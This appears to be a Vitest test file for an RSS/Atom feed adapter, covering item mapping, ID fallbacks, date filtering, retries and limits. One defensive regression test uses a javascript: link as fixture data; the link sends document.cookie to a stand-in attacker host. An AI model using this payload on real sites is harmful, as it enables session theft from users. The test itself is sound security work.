import { describe, expect, it, vi } from 'vitest';
import { createHash } from 'node:crypto';
import {
  RssAdapter,
  type FetchLike,
  type HttpResponseLike,
  type RssFeedConfig,
} from '../../src/sources/rss.js';

// ---------------------------------------------------------------------------
// Fixtures — small, hand-crafted XML shaped like the REAL feeds this
// adapter is configured against by default (verified live against the
// actual endpoints during Phase 8 implementation, see rss.ts's module doc
// comment): a WordPress-generated RSS 2.0 feed (TechCrunch/Ars Technica
// shape, `<guid>` present) and an Atom feed (The Verge shape, `<id>`
// instead of `<guid>`). Not live network calls — parsed via the real
// `rss-parser` library through the adapter's injected `FetchLike`.
// ---------------------------------------------------------------------------

function rssFeedXml(itemsXml: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel>
<title>Test Tech Feed</title>
<link>https://example.com</link>
<description>Test feed</description>
${itemsXml}
</channel>
</rss>`;
}

function rssItemXml(opts: {
  readonly title: string;
  readonly link: string;
  readonly guid?: string;
  readonly guidIsPermaLink?: boolean;
  readonly pubDate: string;
  readonly creator?: string;
  readonly description?: string;
}): string {
  return `<item>
<title>${opts.title}</title>
<link>${opts.link}</link>
${opts.creator ? `<dc:creator><![CDATA[${opts.creator}]]></dc:creator>` : ''}
<pubDate>${opts.pubDate}</pubDate>
${opts.guid ? `<guid isPermaLink="${opts.guidIsPermaLink ?? false}">${opts.guid}</guid>` : ''}
${opts.description ? `<description><![CDATA[${opts.description}]]></description>` : ''}
</item>`;
}

function atomFeedXml(entriesXml: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
<title>Test Atom Feed</title>
<id>https://example.com/atom</id>
<updated>2026-08-13T00:00:00Z</updated>
${entriesXml}
</feed>`;
}

function atomEntryXml(opts: {
  readonly title: string;
  readonly link: string;
  readonly id: string;
  readonly published: string;
  readonly author?: string;
  readonly summary?: string;
}): string {
  return `<entry>
<title>${opts.title}</title>
<link rel="alternate" href="${opts.link}" />
<id>${opts.id}</id>
<published>${opts.published}</published>
<updated>${opts.published}</updated>
${opts.author ? `<author><name>${opts.author}</name></author>` : ''}
${opts.summary ? `<summary><![CDATA[${opts.summary}]]></summary>` : ''}
</entry>`;
}

function okResponse(body: string): HttpResponseLike {
  return { ok: true, status: 200, text: () => Promise.resolve(body) };
}

function errorResponse(status: number): HttpResponseLike {
  return { ok: false, status, text: () => Promise.resolve('') };
}

const FEED_A: RssFeedConfig = { name: 'feed-a', url: 'https://feed-a.example.com/rss.xml' };
const FEED_B: RssFeedConfig = { name: 'feed-b', url: 'https://feed-b.example.com/atom.xml' };

function sha256(input: string): string {
  return createHash('sha256').update(input).digest('hex');
}

describe('RssAdapter', () => {
  it('maps an RSS 2.0 item into a fully-populated SourceRecord with a launch signal', async () => {
    const xml = rssFeedXml(
      rssItemXml({
        title: 'Acme raises $5M seed round',
        link: 'https://techcrunch.com/2026/08/13/acme-seed/',
        guid: 'https://techcrunch.com/?p=123',
        pubDate: 'Thu, 13 Aug 2026 22:12:40 +0000',
        creator: 'Jane Reporter',
        description: 'Acme announced a $5M seed round led by Example Ventures.',
      }),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    const [record] = pages[0]!.records;
    expect(record!.source).toBe('rss');
    expect(record!.sourceId).toBe('https://techcrunch.com/?p=123');
    expect(record!.extracted.name).toBe('Acme raises $5M seed round');
    expect(record!.extracted.description).toBe(
      'Acme announced a $5M seed round led by Example Ventures.',
    );
    expect(record!.extracted.url).toBe('https://techcrunch.com/2026/08/13/acme-seed/');
    // dc:creator is the article's journalist, never a founder/contributor
    // -- ExtractedCompany.people must NOT be populated from it.
    expect(record!.extracted.people).toBeUndefined();
    expect(record!.extracted.signals).toEqual([
      {
        kind: 'launch',
        value: 1,
        observedAt: new Date('Thu, 13 Aug 2026 22:12:40 +0000').toISOString(),
        source: 'rss',
        evidenceUrl: 'https://techcrunch.com/2026/08/13/acme-seed/',
      },
    ]);
  });

  it('maps an Atom entry, using <id> as sourceId since rss-parser does not normalize it to guid', async () => {
    const xml = atomFeedXml(
      atomEntryXml({
        title: 'Widgetly launches public beta',
        link: 'https://theverge.com/2026/08/13/widgetly-beta',
        id: 'https://theverge.com/?p=979977',
        published: '2026-08-13T21:06:15-04:00',
        author: 'Sean Reporter',
        summary: 'Widgetly opened its public beta today after a year in stealth.',
      }),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_B] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    const [record] = pages[0]!.records;
    expect(record!.sourceId).toBe('https://theverge.com/?p=979977');
    expect(record!.extracted.name).toBe('Widgetly launches public beta');
    // Atom <author> is the journalist, same reasoning as dc:creator above.
    expect(record!.extracted.people).toBeUndefined();
    expect(record!.extracted.signals[0]!.kind).toBe('launch');
  });

  it('derives a stable hash-based sourceId when neither guid nor id is present, deterministic across runs', async () => {
    const xml = rssFeedXml(
      rssItemXml({
        title: 'No-guid item',
        link: 'https://example.com/articles/no-guid-item',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));

    const firstRun = new RssAdapter(fetchImpl, { feeds: [FEED_A] });
    const pagesFirst = [];
    for await (const page of firstRun.fetch({ limit: 10, signal: new AbortController().signal })) {
      pagesFirst.push(page);
    }

    const secondRun = new RssAdapter(fetchImpl, { feeds: [FEED_A] });
    const pagesSecond = [];
    for await (const page of secondRun.fetch({ limit: 10, signal: new AbortController().signal })) {
      pagesSecond.push(page);
    }

    const idFirst = pagesFirst[0]!.records[0]!.sourceId;
    const idSecond = pagesSecond[0]!.records[0]!.sourceId;
    expect(idFirst).toBe(idSecond);
    expect(idFirst).toBe(sha256('https://example.com/articles/no-guid-item'));
  });

  it('produces different fallback sourceIds for different links (not a constant hash)', async () => {
    const xmlOne = rssFeedXml(
      rssItemXml({
        title: 'Item One',
        link: 'https://example.com/articles/one',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    const xmlTwo = rssFeedXml(
      rssItemXml({
        title: 'Item Two',
        link: 'https://example.com/articles/two',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    const fetchImplOne: FetchLike = vi.fn(() => Promise.resolve(okResponse(xmlOne)));
    const fetchImplTwo: FetchLike = vi.fn(() => Promise.resolve(okResponse(xmlTwo)));

    const adapterOne = new RssAdapter(fetchImplOne, { feeds: [FEED_A] });
    const pagesOne = [];
    for await (const page of adapterOne.fetch({
      limit: 10,
      signal: new AbortController().signal,
    })) {
      pagesOne.push(page);
    }
    const adapterTwo = new RssAdapter(fetchImplTwo, { feeds: [FEED_A] });
    const pagesTwo = [];
    for await (const page of adapterTwo.fetch({
      limit: 10,
      signal: new AbortController().signal,
    })) {
      pagesTwo.push(page);
    }

    expect(pagesOne[0]!.records[0]!.sourceId).not.toBe(pagesTwo[0]!.records[0]!.sourceId);
  });

  it('filters out items whose observedAt is not after opts.since (client-side, no server-side since query)', async () => {
    const xml = rssFeedXml(
      [
        rssItemXml({
          title: 'Old item',
          link: 'https://example.com/old',
          guid: 'guid-old',
          pubDate: 'Mon, 01 Jun 2026 00:00:00 +0000',
        }),
        rssItemXml({
          title: 'New item',
          link: 'https://example.com/new',
          guid: 'guid-new',
          pubDate: 'Fri, 14 Aug 2026 00:00:00 +0000',
        }),
      ].join('\n'),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const since = new Date('Wed, 01 Jul 2026 00:00:00 +0000').toISOString();
    const pages = [];
    for await (const page of adapter.fetch({
      since,
      limit: 10,
      signal: new AbortController().signal,
    })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    expect(pages[0]!.records).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('New item');
  });

  it('does not crash the whole fetch when one feed returns non-XML, and still yields the other feed', async () => {
    const goodXml = rssFeedXml(
      rssItemXml({
        title: 'Good item',
        link: 'https://example.com/good',
        guid: 'guid-good',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    const onFeedError = vi.fn();
    const fetchImpl: FetchLike = vi.fn((url: string) => {
      if (url === FEED_A.url) return Promise.resolve(okResponse('not xml at all {{{'));
      return Promise.resolve(okResponse(goodXml));
    });
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A, FEED_B], onFeedError });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('Good item');
    expect(onFeedError).toHaveBeenCalledTimes(1);
    expect(onFeedError.mock.calls[0]![0]).toEqual(FEED_A);
  });

  it('does not crash on an empty channel (valid XML, zero items) and yields no page for it', async () => {
    const emptyXml = rssFeedXml('');
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(emptyXml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(0);
  });

  it('skips an individual item missing a title without dropping the rest of the feed', async () => {
    const xml = rssFeedXml(
      [
        `<item><link>https://example.com/no-title</link><pubDate>Thu, 13 Aug 2026 10:00:00 +0000</pubDate></item>`,
        rssItemXml({
          title: 'Has a title',
          link: 'https://example.com/has-title',
          guid: 'guid-has-title',
          pubDate: 'Thu, 13 Aug 2026 11:00:00 +0000',
        }),
      ].join('\n'),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    expect(pages[0]!.records).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('Has a title');
  });

  it('drops an item with no parseable date instead of faking observedAt as "now"', async () => {
    // Regression: falling back to "now" would make an undated item
    // re-yield on every run (since-filtering could never exclude it) and
    // its recency score would drift forward indefinitely. Dropping it is
    // the only choice consistent with the domain's own "a Signal is never
    // a bare, unattributable number" principle.
    const xml = rssFeedXml(
      [
        `<item><title>No date at all</title><link>https://example.com/no-date</link></item>`,
        rssItemXml({
          title: 'Has a date',
          link: 'https://example.com/has-date',
          guid: 'guid-has-date',
          pubDate: 'Thu, 13 Aug 2026 11:00:00 +0000',
        }),
      ].join('\n'),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    expect(pages[0]!.records).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('Has a date');
  });

  it('drops a non-http(s) <link> (e.g. javascript:) instead of setting url/evidenceUrl to it', async () => {
    // Regression: a fresh review found evidenceUrl is rendered as a raw
    // <a href> in src/ui/index.html. Nothing upstream of this adapter
    // validates <link> is actually an http(s) URL -- a malicious or
    // compromised feed publishing `<link>javascript:...</link>` would
    // otherwise flow straight through to a clickable, script-executing
    // link. The item itself is still kept (title/description are safe,
    // rendered via textContent) -- only the unsafe url/evidenceUrl is
    // dropped, not the whole record.
    const xml = rssFeedXml(
      rssItemXml({
        title: 'Malicious Feed Item',
        link: "javascript:fetch('https://attacker.example/exfil?c='+document.cookie)",
        guid: 'guid-malicious',
        pubDate: 'Thu, 13 Aug 2026 11:00:00 +0000',
        description: 'still a legitimate-looking description',
      }),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages).toHaveLength(1);
    const [record] = pages[0]!.records;
    expect(record!.extracted.name).toBe('Malicious Feed Item');
    expect(record!.extracted.url).toBeUndefined();
    expect(record!.extracted.signals.some((s) => s.evidenceUrl)).toBe(false);
  });

  it('stops once opts.limit is reached across multiple feeds', async () => {
    const feedXml = (title: string, guid: string) =>
      rssFeedXml(
        [
          rssItemXml({
            title: `${title} 1`,
            link: `https://example.com/${guid}-1`,
            guid: `${guid}-1`,
            pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
          }),
          rssItemXml({
            title: `${title} 2`,
            link: `https://example.com/${guid}-2`,
            guid: `${guid}-2`,
            pubDate: 'Thu, 13 Aug 2026 11:00:00 +0000',
          }),
        ].join('\n'),
      );
    const fetchImpl: FetchLike = vi.fn((url: string) => {
      if (url === FEED_A.url) return Promise.resolve(okResponse(feedXml('A', 'a')));
      return Promise.resolve(okResponse(feedXml('B', 'b')));
    });
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A, FEED_B] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 3, signal: new AbortController().signal })) {
      pages.push(page);
    }

    const totalRecords = pages.reduce((sum, p) => sum + p.records.length, 0);
    expect(totalRecords).toBe(3);
    // Second feed's fetch is never reached because feed A alone already
    // satisfies the limit (2 < 3, so feed B contributes only 1 more).
    expect(fetchImpl).toHaveBeenCalledTimes(2);
  });

  it('throws immediately when the signal is already aborted, without making a request', async () => {
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(rssFeedXml(''))));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });
    const controller = new AbortController();
    controller.abort();

    await expect(async () => {
      for await (const page of adapter.fetch({ limit: 10, signal: controller.signal })) {
        void page;
      }
    }).rejects.toThrow();
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('retries a transient 5xx on the feed request and eventually succeeds', async () => {
    const goodXml = rssFeedXml(
      rssItemXml({
        title: 'Recovered item',
        link: 'https://example.com/recovered',
        guid: 'guid-recovered',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    let calls = 0;
    const fetchImpl: FetchLike = vi.fn(() => {
      calls += 1;
      if (calls < 3) return Promise.resolve(errorResponse(503));
      return Promise.resolve(okResponse(goodXml));
    });
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(calls).toBe(3);
    expect(pages).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('Recovered item');
  });

  it('does not retry a permanent 4xx and skips just that feed, continuing to the next', async () => {
    const goodXml = rssFeedXml(
      rssItemXml({
        title: 'Feed B item',
        link: 'https://example.com/feed-b-item',
        guid: 'guid-feed-b',
        pubDate: 'Thu, 13 Aug 2026 10:00:00 +0000',
      }),
    );
    const onFeedError = vi.fn();
    const fetchImpl: FetchLike = vi.fn((url: string) => {
      if (url === FEED_A.url) return Promise.resolve(errorResponse(404));
      return Promise.resolve(okResponse(goodXml));
    });
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A, FEED_B], onFeedError });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    // Exactly 1 call for feed A (no retry on 404) + 1 call for feed B.
    expect(fetchImpl).toHaveBeenCalledTimes(2);
    expect(pages).toHaveLength(1);
    expect(pages[0]!.records[0]!.extracted.name).toBe('Feed B item');
    expect(onFeedError).toHaveBeenCalledTimes(1);
  });

  it('computes nextWatermark as the max observedAt seen within a feed page', async () => {
    const xml = rssFeedXml(
      [
        rssItemXml({
          title: 'Earlier',
          link: 'https://example.com/earlier',
          guid: 'guid-earlier',
          pubDate: 'Thu, 13 Aug 2026 08:00:00 +0000',
        }),
        rssItemXml({
          title: 'Later',
          link: 'https://example.com/later',
          guid: 'guid-later',
          pubDate: 'Thu, 13 Aug 2026 20:00:00 +0000',
        }),
      ].join('\n'),
    );
    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });

    const pages = [];
    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
      pages.push(page);
    }

    expect(pages[0]!.nextWatermark).toBe(new Date('Thu, 13 Aug 2026 20:00:00 +0000').toISOString());
  });
});
